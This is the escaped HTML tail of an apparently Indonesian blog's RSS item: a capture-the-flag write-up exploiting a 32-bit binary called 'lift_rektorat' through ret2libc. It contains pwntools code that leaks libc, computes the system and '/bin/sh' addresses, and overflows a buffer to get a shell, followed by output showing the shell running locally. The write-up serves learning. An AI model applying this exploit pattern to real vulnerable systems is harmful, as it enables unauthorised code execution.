r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|____________________||-------------||------------||__________________|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()

log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;--------- STAGE 2 ---------&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

libc_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(u32(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvn(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;))) &lt;span style=&#34;color:#75715e&#34;&gt;# leaked libc address&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# local libc, saelo&amp;#39;s vm ctfbox, Ubuntu 14.04.5 LTS, vagrant&lt;/span&gt;
puts_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00064da0&lt;/span&gt;
system_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0003fe70&lt;/span&gt;
str_bin_sh_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0015ff0c&lt;/span&gt;

libc_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_puts &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; puts_offset
libc_system &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; system_offset
libc_bin_sh &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str_bin_sh_offset

buf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# junk&lt;/span&gt;
buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(libc_system)
buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;DEAD&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# junk&lt;/span&gt;
buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(libc_bin_sh)

r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(buf)
r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;$profit&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Starting local process &#39;./lift_rektorat&#39;: pid 5802
[*] &#39;/home/vagrant/ctf/agrihack0x2/lift_rektorat&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] --------- STAGE 1 ---------
[*] --------- STAGE 2 ---------
[*] Switching to interactive mode
\x86\x84\x0�    ]��a��`�
[..redacted..]
$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
$ whoami
vagrant
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Solved!&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Sedikit cerita dibalik penemuan flag pada soal kali ini, sebelum saya mengerjakan soal ini sendiri, saya belum paham apa itu ROP dan berbagai macam permasalahan pada soal disini. &lt;strong&gt;Lesson learned:&lt;/strong&gt; 32-bit calling convention, ret2libc, simple ROP.&lt;/p&gt;
</description>
       </item>
       
     </channel>
   </rss>
